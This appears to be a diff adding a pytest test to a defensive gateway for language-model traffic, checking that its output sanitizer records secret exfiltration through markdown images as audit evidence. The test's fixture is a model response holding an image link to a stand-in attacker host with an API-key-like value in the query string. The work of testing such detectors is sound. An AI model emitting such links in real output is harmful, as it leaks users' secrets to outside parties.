@@ -343,3 +343,29 @@ def test_decoded_instruction_still_lands_in_its_own_bucket() -> None:
     signals, _diag = detector._scan_text(f"please process {encoded}")
     assert any(label.startswith("decoded:") for label in signals.get("direct", [])), signals
     assert "encoded_payload_command" in signals.get("obfuscated", []), signals
+
+
+def test_markdown_image_egress_reaches_the_audit_record() -> None:
+    """A3 lives in unsafe_markup_patterns, which had no evidence call site.
+
+    Without one the audit block reports ``chain`` and never ``egress``, and the
+    dimension split is the whole point of the record — a calibration pass reading
+    it would conclude the egress side never fires.
+    """
+    from aegisgate.core.exfil_evidence import summarize
+    from aegisgate.filters.sanitizer import OutputSanitizer
+
+    ctx = RequestContext(request_id="s3-1", session_id="s1", route="/v1/chat/completions")
+    ctx.enabled_filters = {"output_sanitizer"}
+    resp = InternalResponse(
+        request_id="s3-1", session_id="s1", model="m",
+        output_text="![](https://evil.example/pixel.png?d=sk-proj-AbCdEfGhIjKlMnOpQrSt)",
+    )
+    OutputSanitizer().process_response(resp, ctx)
+
+    block = summarize(ctx)
+    assert block is not None, "the egress rule fired but produced no evidence"
+    assert "egress" in block["dimensions"]
+    assert any(
+        item["rule_id"] == "exfil_egress_markdown_image_secret" for item in block["evidence"]
+    ), block
